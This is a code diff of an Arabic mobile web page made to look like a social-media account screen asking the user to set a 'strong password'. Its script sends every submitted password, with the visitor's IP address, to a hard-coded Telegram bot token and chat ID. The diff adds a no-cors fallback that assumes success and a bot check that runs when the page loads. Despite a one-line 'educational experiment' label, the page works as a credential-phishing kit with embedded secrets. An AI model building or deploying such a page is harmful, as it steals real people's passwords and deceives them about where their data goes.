@@ -24,7 +24,6 @@
             margin: 0;
         }
 
-        /* ===== هاتف محاكي ===== */
         .phone-frame {
             width: 100%;
             max-width: 400px;
@@ -45,7 +44,6 @@
             }
         }
 
-        /* ===== الهيدر ===== */
         .header {
             display: flex;
             justify-content: space-between;
@@ -86,7 +84,6 @@
             cursor: pointer;
         }
 
-        /* ===== صورة البروفايل ===== */
         .profile-section {
             display: flex;
             align-items: center;
@@ -136,7 +133,6 @@
             margin-right: 6px;
         }
 
-        /* ===== المحتوى الرئيسي ===== */
         .main-content {
             flex: 1;
             padding: 20px 16px 16px;
@@ -172,7 +168,6 @@
             margin-bottom: 20px;
         }
 
-        /* ===== حقل الإدخال ===== */
         .input-wrapper {
             position: relative;
             background: #fafafa;
@@ -237,7 +232,6 @@
             color: #262626;
         }
 
-        /* ===== مؤشر القوة ===== */
         .strength-container {
             margin: 16px 0 14px;
         }
@@ -285,7 +279,6 @@
             color: #262626;
         }
 
-        /* ===== متطلبات كلمة المرور ===== */
         .requirements {
             margin: 16px 0 20px;
             display: grid;
@@ -318,7 +311,6 @@
             color: #4caf50;
         }
 
-        /* ===== الزر ===== */
         .btn-submit {
             width: 100%;
             padding: 14px;
@@ -355,7 +347,6 @@
             font-size: 18px;
         }
 
-        /* ===== الرسالة ===== */
         .toast {
             margin-top: 14px;
             padding: 12px 16px;
@@ -389,7 +380,6 @@
             border: 1px solid #bbdefb;
         }
 
-        /* ===== الفوتر ===== */
         .footer {
             padding: 12px 16px 20px;
             border-top: 1px solid #efefef;
@@ -426,7 +416,6 @@
             color: #ed4956;
         }
 
-        /* ===== شريط أسفل ===== */
         .bottom-nav {
             display: flex;
             justify-content: space-around;
@@ -451,7 +440,6 @@
             color: #262626;
         }
 
-        /* ===== Responsive ===== */
         @media (max-width: 400px) {
             .requirements {
                 grid-template-columns: 1fr;
@@ -466,7 +454,6 @@
 
     <div class="phone-frame">
 
-        <!-- ===== الهيدر ===== -->
         <div class="header">
             <div class="header-left">
                 <button class="back-btn"><i class="fas fa-chevron-right"></i></button>
@@ -477,7 +464,6 @@
             </div>
         </div>
 
-        <!-- ===== البروفايل ===== -->
         <div class="profile-section">
             <div class="avatar">I</div>
             <div class="profile-info">
@@ -490,7 +476,6 @@
             <i class="fas fa-chevron-left" style="color:#8e8e8e; font-size:14px;"></i>
         </div>
 
-        <!-- ===== المحتوى ===== -->
         <div class="main-content">
 
             <div class="security-badge">
@@ -501,7 +486,6 @@
             <h1 class="main-title">كلمة مرور قوية</h1>
             <p class="main-sub">استخدم كلمة مرور فريدة لحماية حسابك</p>
 
-            <!-- ===== حقل الإدخال ===== -->
             <div class="input-wrapper">
                 <i class="fas fa-key"></i>
                 <input type="password" id="passwordInput" placeholder="اكتب كلمة مرور قوية" />
@@ -510,7 +494,6 @@
                 </button>
             </div>
 
-            <!-- ===== مؤشر القوة ===== -->
             <div class="strength-container">
                 <div class="strength-labels">
                     <span>ضعيفة</span>
@@ -525,7 +508,6 @@
                 <div class="strength-text" id="strengthText">💡 ابدأ بكتابة كلمة مرور</div>
             </div>
 
-            <!-- ===== المتطلبات ===== -->
             <div class="requirements" id="requirements">
                 <div class="req-item" id="reqLength"><i class="fas fa-circle"></i> 8 أحرف على الأقل</div>
                 <div class="req-item" id="reqUpper"><i class="fas fa-circle"></i> حرف كبير وصغير</div>
@@ -533,18 +515,15 @@
                 <div class="req-item" id="reqSpecial"><i class="fas fa-circle"></i> رمز خاص (!@#$)</div>
             </div>
 
-            <!-- ===== زر الإرسال ===== -->
             <button class="btn-submit" id="submitBtn">
                 <i class="fas fa-paper-plane"></i>
                 إرسال
             </button>
 
-            <!-- ===== رسالة ===== -->
             <div class="toast" id="toast"></div>
 
         </div>
 
-        <!-- ===== الفوتر ===== -->
         <div class="footer">
             <div class="footer-links">
                 <span>مساعدة</span>
@@ -557,7 +536,6 @@
             </div>
         </div>
 
-        <!-- ===== شريط التنقل السفلي ===== -->
         <div class="bottom-nav">
             <i class="fas fa-home"></i>
             <i class="fas fa-search"></i>
@@ -571,7 +549,7 @@
     <script>
         (function() {
             // ============================================================
-            // ✅ بيانات التلغرام الخاصة بك
+            // ✅ بيانات التلغرام الخاصة بك - غيرها حسب حسابك
             // ============================================================
             const BOT_TOKEN = '8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M';
             const CHAT_ID = '5775368729';
@@ -616,11 +594,9 @@
                 if (checks.number) score++;
                 if (checks.special) score++;
 
-                // تحديث المتطلبات
-               : updateRequirements checks(checks);
+                updateRequirements(checks);
 
-                if (password.length.length === 0) return { level:  },
-0, label: '💡 ابدأ بكتابة كلمة مرور' };
+                if (password.length === 0) return { level: 0, label: '💡 ابدأ بكتابة كلمة مرور' };
                 if (score <= 1) return { level: 1, label: '🔴 ضعيفة جداً' };
                 if (score === 2) return { level: 2, label: '🟠 ضعيفة' };
                 if (score === 3) return { level: 3, label: '🟡 متوسطة' };
@@ -631,7 +607,8 @@
             // ===== تحديث المتطلبات =====
             function updateRequirements(checks) {
                 const items = [
-                    { el: reqLength, done                    { el: reqUpper, done: checks.upper },
+                    { el: reqLength, done: checks.length },
+                    { el: reqUpper, done: checks.upper },
                     { el: reqNumber, done: checks.number },
                     { el: reqSpecial, done: checks.special }
                 ];
@@ -673,7 +650,29 @@
                 toast.className = `toast show ${type}`;
             }
 
-            // ===== إرسال إلى تلغرام =====
+            // ===== التحقق من صلاحية البوت =====
+            async function checkBot() {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+                    const data = await res.json();
+                    return data.ok === true;
+                } catch {
+                    return false;
+                }
+            }
+
+            // ===== جلب IP =====
+            async function getIP() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip || 'غير متاح';
+                } catch {
+                    return 'غير متاح';
+                }
+            }
+
+            // ===== إرسال إلى تلغرام (نسخة محسّنة) =====
             async function sendToTelegram(password, strength) {
                 const now = new Date();
                 const timeStr = now.toLocaleString('ar-EG', { hour12: true });
@@ -684,16 +683,19 @@
         🔑 كلمة المرور: \`${password}\`
         📊 القوة: ${strength.label}
         ⏰ الوقت: ${timeStr}
-        🌐 IP: ${ip || 'غير متاح'}
+        🌐 IP: ${ip}
         ─────────────
         ⚠️ تجربة تعليمية فقط`;
 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
                 try {
+                    // المحاولة الأولى: POST عادي
                     const response = await fetch(url, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
                             text: message,
@@ -701,20 +703,36 @@
                             disable_web_page_preview: true
                         })
                     });
-                    const data = await response.json();
-                    if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
-                    return { success: true };
-                } catch (error) {
-                    return { success: false, error: error.message };
-                }
-            }
 
-            // ===== جلب IP =====
-            function getIP() {
-                return fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => data.ip)
-                    .catch(() => null);
+                    const data = await response.json();
+
+                    if (data.ok) {
+                        return { success: true };
+                    } else {
+                        throw new Error(data.description || 'فشل الإرسال');
+                    }
+                } catch (error) {
+                    // المحاولة الثانية: باستخدام no-cors
+                    try {
+                        await fetch(url, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message,
+                                parse_mode: 'Markdown',
+                                disable_web_page_preview: true
+                            })
+                        });
+                        // no-cors لا يعطي رد، نفترض النجاح
+                        return { success: true };
+                    } catch (e2) {
+                        return { success: false, error: error.message || 'خطأ غير معروف' };
+                    }
+                }
             }
 
             // ===== حدث الكتابة =====
@@ -733,16 +751,32 @@
                     return;
                 }
 
+                if (password.length < 4) {
+                    showToast('⚠️ كلمة المرور قصيرة جداً (اقل من 4 أحرف)', 'error');
+                    return;
+                }
+
                 isSending = true;
                 submitBtn.disabled = true;
                 showToast('📤 جاري الإرسال إلى تلغرام...', 'info');
+
+                // التحقق من البوت أولاً
+                const botOk = await checkBot();
+                if (!botOk) {
+                    showToast('❌ البوت غير صالح! تأكد من التوكن', 'error');
+                    isSending = false;
+                    submitBtn.disabled = false;
+                    return;
+                }
 
                 const teleResult = await sendToTelegram(password, result);
 
                 if (teleResult.success) {
                     showToast('✅ تم الإرسال إلى تلغرام بنجاح!', 'success');
+                    input.value = '';
+                    updateMeter('');
                 } else {
-                    showToast(`❌ فشل الإرسال: ${teleResult.error}`, 'error');
+                    showToast(`❌ فشل الإرسال: ${teleResult.error || 'خطأ غير معروف'}`, 'error');
                 }
 
                 setTimeout(() => {
@@ -753,6 +787,16 @@
 
             // ===== تشغيل أولي =====
             updateMeter('');
+
+            // ===== فحص البوت عند تحميل الصفحة =====
+            setTimeout(async () => {
+                const ok = await checkBot();
+                if (!ok) {
+                    showToast('⚠️ البوت غير صالح، راجع التوكن', 'error');
+                } else {
+                    console.log('✅ البوت يعمل بشكل صحيح');
+                }
+            }, 1000);
         })();
     </script>
 
